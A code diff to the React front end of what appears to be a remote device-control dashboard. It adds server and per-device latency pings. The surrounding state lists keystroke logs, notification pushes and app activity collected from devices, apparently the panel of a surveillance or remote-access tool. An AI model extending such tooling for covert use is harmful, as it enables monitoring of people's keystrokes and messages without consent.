@@ -1,4 +1,4 @@
-import React, { useState, useCallback } from 'react';
+import React, { useState, useCallback, useRef, useEffect } from 'react';
 import { useWebSocket } from './hooks/useWebSocket.js';
 import Sidebar from './components/Sidebar.jsx';
 import DeviceControl from './components/DeviceControl.jsx';
@@ -16,6 +16,14 @@ export default function App() {
   const [keylogPushEntries, setKeylogPushEntries] = useState([]);
   const [notifPushEntries, setNotifPushEntries] = useState([]);
   const [activityAppEntries, setActivityAppEntries] = useState([]);
+
+  // ── Latency tracking ──────────────────────────────────────────────────
+  // serverLatency: dashboard ↔ server RTT in ms (null = not yet measured)
+  // deviceLatencies: { [deviceId]: ms } — command round-trip for each device
+  const [serverLatency, setServerLatency] = useState(null);
+  const [deviceLatencies, setDeviceLatencies] = useState({});
+  // Tracks {commandId → {deviceId, sentAt}} for ping commands in flight
+  const pingPendingRef = useRef({});
 
   const handleMessage = useCallback((event, data) => {
     switch (event) {
@@ -65,7 +73,22 @@ export default function App() {
 
       case 'command:sent':
         setPendingCommands(prev => ({ ...prev, [data.commandId]: data }));
+        // If we have a pending probe sentAt for this device+ping, promote to commandId key
+        if (data.command === 'ping' && data.deviceId) {
+          const pendingKey = `__pending_${data.deviceId}`;
+          if (pingPendingRef.current[pendingKey] !== undefined) {
+            pingPendingRef.current[data.commandId] = { deviceId: data.deviceId, sentAt: pingPendingRef.current[pendingKey] };
+            delete pingPendingRef.current[pendingKey];
+          }
+        }
         break;
+
+      case 'dashboard:pong': {
+        if (data?.sentAt) {
+          setServerLatency(Date.now() - data.sentAt);
+        }
+        break;
+      }
 
       case 'command:result': {
         setPendingCommands(prev => {
@@ -73,6 +96,12 @@ export default function App() {
           delete next[data.commandId];
           return next;
         });
+        // If this was a latency-ping command, record device RTT
+        if (data.commandId && pingPendingRef.current[data.commandId]) {
+          const { deviceId, sentAt } = pingPendingRef.current[data.commandId];
+          delete pingPendingRef.current[data.commandId];
+          setDeviceLatencies(prev => ({ ...prev, [deviceId]: Date.now() - sentAt }));
+        }
         const result = {
           id: data.commandId || Date.now(),
           command: data.command,
@@ -155,6 +184,33 @@ export default function App() {
     send('command:send', { deviceId, command, params });
   }, [send]);
 
+  // ── Periodic server latency ping (every 5 s) ──────────────────────────
+  useEffect(() => {
+    if (!connected) return;
+    const tick = () => send('dashboard:ping', { sentAt: Date.now() });
+    tick(); // immediate first ping
+    const id = setInterval(tick, 5000);
+    return () => clearInterval(id);
+  }, [connected, send]);
+
+  // ── Periodic device latency ping (every 10 s per selected device) ────
+  const sendDevicePing = useCallback((deviceId) => {
+    const sentAt = Date.now();
+    // Use a pseudo-commandId: the server returns command:sent with the real one
+    // We intercept via command:sent to capture the actual commandId
+    send('command:send', { deviceId, command: 'ping', params: null, _latencyProbe: true });
+    // Store sentAt keyed by deviceId; updated when command:sent arrives
+    pingPendingRef.current[`__pending_${deviceId}`] = sentAt;
+  }, [send]);
+
+  useEffect(() => {
+    if (!connected || !selectedDevice) return;
+    const tick = () => sendDevicePing(selectedDevice);
+    tick();
+    const id = setInterval(tick, 10000);
+    return () => clearInterval(id);
+  }, [connected, selectedDevice, sendDevicePing]);
+
   return (
     <div className="app">
       <StatusBar connected={connected} reconnecting={reconnecting} deviceCount={devices.filter(d => d.isOnline).length} />
@@ -177,6 +233,8 @@ export default function App() {
               keylogPushEntries={keylogPushEntries.filter(e => e.deviceId === selectedDevice)}
               notifPushEntries={notifPushEntries.filter(e => e.deviceId === selectedDevice)}
               activityAppEntries={activityAppEntries.filter(e => e.deviceId === selectedDevice)}
+              serverLatency={serverLatency}
+              deviceLatency={deviceLatencies[selectedDevice] ?? null}
             />
           ) : (
             <Overview
